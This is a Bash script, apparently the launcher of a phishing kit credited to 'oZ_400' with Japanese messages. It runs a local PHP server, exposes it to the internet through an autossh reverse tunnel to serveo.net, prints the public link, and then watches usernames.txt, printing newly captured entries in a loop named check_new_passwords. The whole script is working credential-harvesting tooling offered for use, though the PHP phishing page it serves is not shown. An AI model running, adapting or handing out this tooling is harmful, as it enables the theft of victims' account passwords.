clear
display_banner() {
    echo -e "\033[0m

開発者 oZ_400

"
}

stop_php_server() {
    kill "$php_server_pid" > /dev/null 2>&1
    exit 0
}

get_tunnel_link() {
    rm -f .ssh.log

    autossh -M 0 -t -R 80:localhost:8080 serveo.net > .ssh.log 2>&1 &
    sleep 10
    ssh_url=$(grep -o 'https://[-0-9a-z]*\.serveo\.net' ".ssh.log")
    if [ -z "$ssh_url" ]; then
        echo "URLが出力に見つかりませんでした。"
    else
        # Extract the subdomain part from ssh_url
        subdomain=$(echo "$ssh_url" | awk -F'https://' '{print $2}' | cut -d'.' -f1)
        echo "Forwarding HTTP traffic from https://$subdomain.serveo.net"
    fi
}

check_new_passwords() {
    if [ ! -f "usernames.txt" ]; then
        echo "usernames.txtが見つかりません。"
        stop_php_server
    fi

    prev_line_count=$(wc -l < "usernames.txt")

    while true; do
        sleep 5
        current_line_count=$(wc -l < "usernames.txt")

        if [ $current_line_count -gt $prev_line_count ]; then
            tail -n +"$((prev_line_count + 1))" "usernames.txt"
            prev_line_count=$current_line_count
        fi
    done
}

trap stop_php_server SIGINT

display_banner

php -S localhost:8080 > /dev/null 2>&1 &
php_server_pid=$!

get_tunnel_link

check_new_passwords &

wait